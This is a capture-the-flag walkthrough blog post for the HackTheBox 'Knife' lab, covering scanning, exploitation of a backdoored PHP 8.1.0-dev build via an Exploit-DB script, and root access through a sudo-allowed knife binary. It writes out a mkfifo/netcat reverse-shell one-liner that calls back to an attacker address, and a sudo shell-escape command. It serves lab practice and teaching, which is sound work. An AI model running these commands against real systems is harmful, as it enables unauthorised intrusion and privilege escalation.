<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Knife HacktheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/knife-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-09-27T10:53:47+00:00">September 27, 2021</time><time class="updated" datetime="2025-06-20T17:31:22+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve the lab name as Knife –Hack the Box. The purpose is to accept the challenge to root the machine. Usage of sudo rights and remote code execution to pwn the victim’s machine.</span></p>
<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<p><strong><span style="color: #000000;">Network Scanning</span></strong></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><strong><span style="color: #000000;">Enumeration</span></strong></p>
<ul>
<li><span style="color: #000000;">Nikto</span></li>
</ul>
<p><strong><span style="color: #000000;">Exploitation</span></strong></p>
<ul>
<li><span style="color: #000000;">RCE (Python)</span></li>
<li><span style="color: #000000;">user.txt</span></li>
</ul>
<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
<ul>
<li><span style="color: #000000;">Sudo Rights</span></li>
<li><span style="color: #000000;">root.txt</span></li>
</ul>
<p> </p>
<p><span style="color: #000000;"><strong>Kali:</strong> Attacker Machine</span></p>
<p><span style="color: #000000;"><strong>Victim’s Machine:</strong> HTB</span></p>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">Run the Nmap to know the open ports and services.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap –A 10.129.223.91</pre>
<p><span style="color: #000000;">As per the Nmap result, two ports are opened i.e. port 80 -HTTP and port 22 –SSH.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-249ylbIrYyE/YVGg6FulOsI/AAAAAAAAysU/wI2qi043wd8rbVbxXd3l6SYkjeOCkYLMACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">So now our only avenue of attack is through port 80 and port 22.</span></p>
<p><span style="color: #000000;">In the first look, we navigate port 80 in the web browser. But nothing informative we achieve here.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.223.91</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZxYUwjxIZKM/YVGg9_uJaKI/AAAAAAAAysY/cbH_4SOyhwUZQAS29CduCmT_qiT2ydLXgCLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Without losing hope we move forward with the web scanner tool name as “Nikto” to get the vulnerability if any.Run the below command and output reveals the retrieved x-powered by the header as PHP/8.1.0-dev</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nikto –h 10.129.223.91</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fZ1f22dZ250/YVGhEKbDABI/AAAAAAAAysg/hUpMpCdBQwYAmVG7hGfJpvlrnDhBs1NiQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Let’s Google the PHP8.1 exploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0yckAhp4_5Y/YVGhJFjgnVI/AAAAAAAAysk/R1xpYxLViYooFYKpG5liGAoVwOUkcfllgCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Above we find that PHP version 8.1 is vulnerable and allow us to do remote code execution. If this version runs on a server, an attacker can execute arbitrary code by sending the User-Agent header.</span></p>
<p><span style="color: #000000;">On exploit db, we get the exploit EBD –ID 49933 download the script from the below link and save it.</span></p>
<p><span style="color: #000000;">URL: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/49933">https://www.exploit-db.com/exploits/49933</a></strong></span></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LNmy9sFoNQE/YVGhOl84-mI/AAAAAAAAysw/vmEkkKqW6H8ZCDb0pZNz5QiGaPrcQ-emwCLcBGAsYHQ/s16000/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">Execute the downloaded script on the kali and enter the full host URL of the victim’s machine (HTB machine). Simultaneously, run the netcat listener on port 1234 the next terminal.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 2334
python3 49933.py
http://10.129.223.91</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2Qo0-uWEgD4/YVGhZGfyxPI/AAAAAAAAytA/dMlgE2hBU7Epo_tD6yQ0blS33iE4cWewQCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">In the above screenshot, we are getting the garbage issue in the shell. Let’s take a reliable shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.100 1234 &gt;/tmp/f</pre>
<p><span style="color: #000000;">Wow!! On the netcat terminal, we have a session, and now the journey of enumeration starts and gets the user.txt.</span></p>
<p><span style="color: #000000;">But our hunger is for root.txt.Let’s proceed to the root flag.</span></p>
<p><span style="color: #000000;">I notice something interesting with sudo rights.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KyeboAZQZTg/YVGhd_G006I/AAAAAAAAytE/QSVLQ18eunsuwZPqQLSBf7vd0YyTblUAgCLcBGAsYHQ/s16000/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">As shown in the above screenshot, user James may run with /usr/bin/knife as a root because he has the sudo privileges with no password.</span></p>
<p><span style="color: #000000;">Let’s see what gtfobins said about the knife:</span></p>
<p><span style="color: #000000;">Knife: This is capable of running ruby code. If the binary is allowed to run as a superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</span></p>
<p><span style="color: #000000;"><strong>Refer</strong>: <strong><a style="color: #000000;" href="https://gtfobins.github.io/gtfobins/knife/#sudo">https://gtfobins.github.io/gtfobins/knife/#sudo</a></strong></span></p>
<p><span style="color: #000000;">Below is the command to run</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;">Finally, We capture the flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KvjlZPmjiQw/YVGhisX8yUI/AAAAAAAAytM/6Li8KfzbT84mp3yXZdhOSveGrJbnCmrWgCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Nisha Sharma is an Experienced and Certified Security Consultant.Highly skilled in Infrastructure, web pentesting along with SIEM and other security devices. Connect with her <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/nishasharmaa"><strong>here</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
